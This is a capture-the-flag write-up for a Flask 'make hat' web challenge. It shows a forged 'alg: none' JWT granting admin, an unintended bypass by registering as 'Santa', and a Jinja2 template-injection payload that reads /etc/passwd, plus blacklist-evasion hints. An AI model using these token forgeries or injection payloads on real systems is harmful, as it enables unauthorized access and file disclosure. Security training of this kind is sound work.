<h2>Solution</h2>

<p>Registering a user and analyzing cookies you will find a cookie called <code>auth</code> containing a JWT.</p>

<p>```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoidXNlciIsInVzZXIiOiJtM3NzYXAwIn0.6MIKOYbtUodqSJUZyT4iGRMLPcrRzbniLjJU8nhNhKY</p>

<p>{"typ":"JWT","alg":"HS256"}.{"type":"user","user":"m3ssap0"}.6MIKOYbtUodqSJUZyT4iGRMLPcrRzbniLjJU8nhNhKY
```</p>

<p>You can check its creation inside <code>register</code> and <code>login</code> methods of the source code <a href="server.py">server.py</a>.</p>

<p>Analyzing the source code you can discover two interesting endpoints:
* <code>/makehat</code> for which you have to be an authorized admin;
* <code>/authorize</code> that can let you to become an authorized admin, but there are some restrictions.</p>

<p>Considering the presence of template rendering operations into <code>/makehat</code> endpoint with a parameter read from the user, i.e. <code>hatName</code>, probably that functionality is vulnerable to <em>Server Side Template Injection</em> (<em>SSTI</em>) due to the insecure usage of <em>Flask/Jinja2</em> template engine.</p>

<p>The first check to bypass for the <code>/authorize</code> endpoint is the following.</p>

<p><code>python
            if (userData["type"] != "admin"):
                return render_template ("error.html", error = "Unauthorized.")
</code></p>

<p>This can be easily bypassed forging a JWT like the following and testing that you are an admin connecting to the root of the website.</p>

<p>```
{"typ":"JWT","alg":"none"}.{"type":"admin","user":"m3ssap0"}.</p>

<p>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoibTNzc2FwMCJ9.
```</p>

At this point you have to break this check.

```python
                if (request.form.get ('accessCode') == str (uid) + usr + pss + userpss):
                    authorizedAdmin [userData ["user"]] = True
```

Analyzing the code you will understand that variables are populated from Santa's data, that data is well known except its secret.

```python
adminPrivileges = [[None]*3]*500

adminPrivileges [0][0] = 0 # UID
adminPrivileges [0][1] = "Santa" #Uname
adminPrivileges [0][2] = SantaSecret
```

<ul>

<p><li><code>str(uid)</code> is <code>0</code>;</li>
<li><code>usr</code> is <code>Santa</code>;</li>
<li><code>pss</code> is the unknown <code>SantaSecret</code>;</li>
<li><code>userpss</code> can be set following the <code>step=1</code> procedure of the <code>/authorize</code> endpoint, so it can be forced.</li></p>

</ul>

At this point I was stuck and I was not able to bypass this check, so I did something (stupid, lol) that led me to what I think was an **unintended solution** to bypass the check: I registered a user with username `Santa`.

The user with username `Santa` was already into `adminPrivileges`, so I only crafted the correct JWT to bypass the previous check and I added the `pass` field needed by the `/makehat` endpoint.

```

<p>Usually, something like the following can be used to access classes loaded into the server and to invoke them.</p>

<p><code>python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
</code></p>

<p>But we have some restrictions, as you can see in the following blacklist used into <code>/makehat</code> endpoint.</p>

<p><code>python
blacklist = ["config", "self", "request", "[", "]", '"', "_", "+", " ", "join", "%", "%25"]
</code></p>

<p>So we have to use some tricks like the hexadecimal encoding of the strings and the <code>attr</code> filter of Jinja2.</p>
